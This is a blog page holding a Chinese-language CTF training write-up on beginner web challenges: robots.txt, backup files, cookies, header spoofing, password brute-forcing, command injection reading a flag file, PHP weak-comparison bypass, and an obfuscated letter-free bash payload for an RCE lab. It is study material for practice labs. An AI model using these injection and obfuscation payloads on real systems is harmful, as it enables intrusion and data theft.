@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025 Spring Week1 | Midnight Phantasmagoria!</title><meta name="author" content="Fischl0527"><meta name="copyright" content="Fischl0527"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="工具   找flag既然提示了flag可能在文件里.所以flag就是: flag{hello_world}或xxxctf{we1c0me!}!  算了,直接看.md文件源代码 flag{we1c0me_t0_CTF!} 题目view_source  get_post python脚本1234567891011121314151617181920import hashlibimport iter">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025 Spring Week1">
+<meta property="og:url" content="https://fischl0527.github.io/2025/03/09/HnuSecTraining/2025SpringWeek1/index.html">
+<meta property="og:site_name" content="Midnight Phantasmagoria!">
+<meta property="og:description" content="工具   找flag既然提示了flag可能在文件里.所以flag就是: flag{hello_world}或xxxctf{we1c0me!}!  算了,直接看.md文件源代码 flag{we1c0me_t0_CTF!} 题目view_source  get_post python脚本1234567891011121314151617181920import hashlibimport iter">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fischl0527.github.io/img/cover/2025SpringWeek1.jpg">
+<meta property="article:published_time" content="2025-03-09T03:45:14.000Z">
+<meta property="article:modified_time" content="2025-05-05T17:26:28.181Z">
+<meta property="article:author" content="Fischl0527">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fischl0527.github.io/img/cover/2025SpringWeek1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2025 Spring Week1",
+  "url": "https://fischl0527.github.io/2025/03/09/HnuSecTraining/2025SpringWeek1/",
+  "image": "https://fischl0527.github.io/img/cover/2025SpringWeek1.jpg",
+  "datePublished": "2025-03-09T03:45:14.000Z",
+  "dateModified": "2025-05-05T17:26:28.181Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Fischl0527",
+      "url": "https://fischl0527.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/null-5119bf9f9071d171.jpg"><link rel="canonical" href="https://fischl0527.github.io/2025/03/09/HnuSecTraining/2025SpringWeek1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2025 Spring Week1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/875E73166434C2B697688F4E9DB5AA6B.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archiveC"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover/2025SpringWeek1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Midnight Phantasmagoria!</span></a><a class="nav-page-title" href="/"><span class="site-name">2025 Spring Week1</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archiveC"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2025 Spring Week1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-03-09T03:45:14.000Z" title="Created 2025-03-09 11:45:14">2025-03-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-05T17:26:28.181Z" title="Updated 2025-05-06 01:26:28">2025-05-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>7mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><meta name="referrer" content="no-referrer"/>
+
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741454242595-b4ff32e5-1846-448b-afe7-0e14a740dc83.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741454163893-c490aed6-3a58-4457-b530-5d3a634b3334.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741454115703-d74aa735-19fe-44ae-b31b-bd213a421243.png"></p>
+<h1 id="找flag"><a href="#找flag" class="headerlink" title="找flag"></a>找flag</h1><p><del>既然提示了flag可能在文件里.所以flag就是:</del></p>
+<p><del>flag{hello_world}或xxxctf{we1c0me!}!</del></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741345655889-63b229cb-6572-416f-8cda-1ba645247553.png"></p>
+<p>算了,直接看.md文件源代码</p>
+<p>flag{we1c0me_t0_CTF!}</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a><font style="background-color:rgb(247, 248, 250);">view_source</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357136118-c537114e-5221-44eb-9d94-8752707eea8a.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357160565-9936e7a7-744c-4cd9-8931-703ceff3ffb3.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357174122-2e3cc884-cb1c-4838-a8b9-788c9108d9cd.png"></p>
+<h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a><font style="background-color:rgb(247, 248, 250);">get_post</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357252448-1ce4a510-91e7-483c-af1e-accd7c28456d.png"></p>
+<h2 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_md5_match</span>(<span class="params">prefix=<span class="string">&quot;19ca14&quot;</span>, max_length=<span class="number">6</span></span>):</span><br><span class="line">    chars = string.ascii_letters + string.digits  <span class="comment"># 可选字符集（字母+数字）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">            test_string = <span class="string">&quot;&quot;</span>.join(candidate)</span><br><span class="line">            md5_hash = hashlib.md5(test_string.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> md5_hash.startswith(prefix):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;找到匹配项: <span class="subst">&#123;test_string&#125;</span> -&gt; <span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> test_string</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到匹配项&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    find_md5_match()</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line"><span class="comment">#找到匹配项: 36 -&gt; 19ca14e7ea6328a42e0eb13d585e4c22</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a><font style="background-color:rgb(247, 248, 250);">robots</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441028199-fb2f8d19-6017-482e-99ae-cc04cf5159b0.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441038475-5df885e1-28a7-474d-8d3c-2889acbf02a1.png"></p>
+<p>robots.txt文件是一个文本文件，使用任何一个常见的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91/6282252?fromModule=lemma_inlink">文本编辑</a>器，比如Windows<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/56370294?fromModule=lemma_inlink">系统安装</a>了Notepad，就可以创建和编辑它<sup> </sup><sup>[1]</sup>。robots.txt是一个协议，而不是一个命令。robots.txt是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/0?fromModule=lemma_inlink">搜索引擎</a>中访问网站的时候要查看的第一个文件。robots.txt文件告诉<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%9C%98%E8%9B%9B%E7%A8%8B%E5%BA%8F/4972146?fromModule=lemma_inlink">蜘蛛程序</a>在服务器上什么文件是可以被查看的。</p>
+<p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95/6061330?fromModule=lemma_inlink">根目录</a>下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%99%BE%E5%BA%A6/6699?fromModule=lemma_inlink">百度</a>官方建议，仅当您的网站包含不希望被<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%94%B6%E5%BD%95/7279593?fromModule=lemma_inlink">搜索引擎收录</a>的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。</p>
+<p>如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p>
+<p>所以直接搜robots.txt<br><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441075896-8132863c-d978-47cd-a713-37f9fcc0b5e7.png"></p>
+<p>再搜flag_ls_h3re.php就行了</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441093308-8a45095d-c0ef-4e25-a2bc-84db789b4fac.png"></h1><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">backup</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441350687-885d330a-2a8f-43df-bbe1-fefa7159b54b.png"></p>
+<p><font style="color:rgb(77, 77, 77);">如果网站存在备份文件，常见的备份文件后缀名有：“.</font><font style="color:rgb(252, 85, 49);">git</font><font style="color:rgb(77, 77, 77);">” 、“.</font><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020"><font style="color:rgb(252, 85, 49);">svn</font></a><font style="color:rgb(77, 77, 77);">”、“ .swp”“.~”、“.bak”</font></p>
+<p><font style="color:rgb(77, 77, 77);">测试到.bak下载了一个文件，打开就是flag</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441384605-35f4b7ea-ca4f-44d1-a162-c4964ad9252a.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441414961-f5f11e46-c7ef-421a-9953-bd6768d51ca1.png"></p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">cookie</font></h2><p>hackbar找cookie</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442192048-def40780-3547-4658-a20c-a637dc7c8585.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442278243-6819ffe5-8309-4f3c-bb0e-e15d422083d6.png"></p>
+<p>hackbar中mode转为raw直接看flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442375256-d57d8f0a-1a66-4a6c-8d2d-7c811b87446e.png"></p>
+<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">disabled_button</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442471567-3c4f7ed5-080e-4d1d-911f-a431985b1a91.png"></p>
+<p>我偏按，改一下这个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442791425-e41390bf-6361-4377-8921-43f5557e60a0.png"></p>
+<p>去掉disabled就行了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442839493-fcaac9cf-05a1-4834-81cb-4f61bd6145d1.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442863075-de444b32-99cf-4f90-888d-60a72ef18df6.png"></p>
+<p>相关知识：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/att_input_disabled.asp">HTML &lt;input&gt; disabled 属性</a></p>
+<h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a><font style="color:rgb(29, 33, 41);">simple_js</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741443805546-060b7f45-efb3-471a-8b13-f390925be0e1.png"></p>
+<p>pass这堆数解密为<font style="color:rgb(64, 64, 64);">FAUX PASSWORD HAHA,那么这堆java代码无论怎么执行,都返回FAUX PASSWORD HAHA,但是源代码有这样的16进制数</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444056540-5faf4687-27a8-45fe-b518-9bafbeb00770.png"></p>
+<p>解码后得到786OsErtk12,盲猜flag,组合一下得到<font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);"> Cyberpeace{</font>786OsErtk12<font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">}</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444165385-434f294f-768c-453d-a066-569072470d01.png"></p>
+<p><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">艹,真对了</font></p>
+<h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">xff_referer</font></h2><p>ez_http,直接hackbar操作就行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444249946-0a560715-e2c7-4db4-820d-d28b6cb76f75.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444270017-ae968c0b-6d2b-4c64-b1d1-39ac60e93734.png"></p>
+<p>得到flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444321941-3d60e355-3f15-4cee-b13f-fafd8bc4e0c5.png"></p>
+<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">weak_auth</font></h2><p>盲猜密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444420790-fea11a88-2cd2-4850-b6f2-5242828b4996.png"></p>
+<p>nb<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444460728-b0a9f247-aab6-4a8d-9179-e1fb039a8f69.png"></p>
+<p>算了爆破一下吧,也练习一下操作</p>
+<p>在爆破点加载用户名和密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444980563-d506efd0-bfa4-43cf-a926-c4ba0b7f4f62.png"></p>
+<p>取得一系列响应</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445076049-427d1771-a1bf-4b18-9276-18ca2b4f2286.png"></p>
+<p>直接找就行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445497436-f2e582aa-0949-4035-b071-86599ef670e1.png"></p>
+<h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">command_execution</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445685856-463ecc85-5c21-4e43-a168-ad82904ab3ed.png"></p>
+<p>不写waf,某些hacker会直接操作你的文件!</p>
+<p>展示文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445676979-32a9d8f8-282f-4016-ab18-9b473c2b1032.png"></p>
+<p>到根目录<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446794846-c87f5979-69b1-4804-a94c-d88b668e6bfe.png"></p>
+<p>找flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446761007-778b4021-7718-4e31-ad46-7ae9ddd648e7.png"></p>
+<p>或者这样找也行,但是flag一被修饰就不行了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446552073-f4084147-3287-49c8-b61f-b6a0a54fabf6.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446576636-43c3529b-4704-45a6-8895-8b054ad13399.png"></p>
+<p>cat &#x2F;home&#x2F;flag.txt 或者nl &#x2F;home&#x2F;flag.txt</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446628498-052c30bf-aa80-4ee2-8420-ad462928565d.png"></p>
+<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">simple_php</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446978252-07351b45-03e3-4e03-b2fe-43f83c9768d1.png"></p>
+<p>原理:</p>
+<p>a&#x3D;’0’中&#x3D;&#x3D; 会先将字符串换成相同类型，再作比较，属于弱类型比较,所以$a&#x3D;&#x3D;0成立</p>
+<p>其次,$a的值原来是ASCLL码值,不为零,所以就绕过去了</p>
+<p>b[]&#x3D;12345被视作数组不是数字,绕过去</p>
+<p>$b的值显然大于1234</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741447095292-8cf72102-728f-4bec-a2ef-195aa9ee283b.png"></p>
+<h1 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h1><p>已经写过了几份笔记,还有课件,都是知识~</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/50616406/1741454675237-aced9a5c-5d64-4888-92f1-b0d8331325e9.jpeg"></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/yangfanyuanhang-0t2rm/dbb38x/mgcgb109aq54kgnr">PHP学习及练习</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/yangfanyuanhang-0t2rm/gygw48/gyi25qn9bp6qonuw">PHP语言的漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2025/pdf/50616406/1741357601274-4a73363b-515c-4c50-b29a-a02ea9ed0b98.pdf">PHP1.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2025/pdf/50616406/1741357602678-b1a6f584-7d9f-41a6-b7cd-8b89182731d6.pdf">PHP2.pdf</a></p>
+<h1 id="REC命令执行"><a href="#REC命令执行" class="headerlink" title="REC命令执行"></a>REC命令执行</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/yangfanyuanhang-0t2rm/dbb38x/gvbosz1b0tb6gahu">0~9题在这里</a></p>
+<p>之前就部署好了<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357756248-816ea714-dc55-4416-970d-c3af001d61eb.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357723940-59aeb6f1-c11d-4a37-bc7c-7876134dc0a7.png"></p>
+<p>后面几题没看到<font style="color:rgb(31, 35, 40);">get_flag.php</font>文件,所以在nss上写了</p>
+<h2 id="RCE-labs-Level-10-无字母命令执行-二进制整数替换"><a href="#RCE-labs-Level-10-无字母命令执行-二进制整数替换" class="headerlink" title="[RCE-labs]Level 10 - 无字母命令执行_二进制整数替换"></a>[RCE-labs]Level 10 - 无字母命令执行_二进制整数替换</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357939954-959b4471-f964-47df-b6f9-67ccd48bd445.png"></p>
+<p>一开始没什么思路，看了一下writeup下载了一个使用的脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/bashFuck">https://github.com/ProbiusOfficial/bashFuck</a><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741360785399-1245e6a0-6e4a-4899-8529-4306a096e60f.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741361396291-5572ffcd-3756-4651-b94f-c9d10d3f9718.png"></p>
+<p>脚本生成的一个palyload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Charset : <span class="comment"># $ &#x27; ( ) 0 &lt; \ &#123; &#125;</span></span><br><span class="line">Total Used: <span class="number">10</span></span><br><span class="line">Total length = <span class="number">444</span></span><br><span class="line">Payload = $<span class="number">0</span>&lt;&lt;&lt;$<span class="number">0</span>\&lt;\&lt;\&lt;\$\<span class="string">&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741360934423-4324d1ac-e8be-49d5-96b9-d0d5a36743f2.png"></p>
+<p>url编码一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741360955905-c1f35c9e-83a9-49d3-b582-4ad96a722a0d.png"></p>
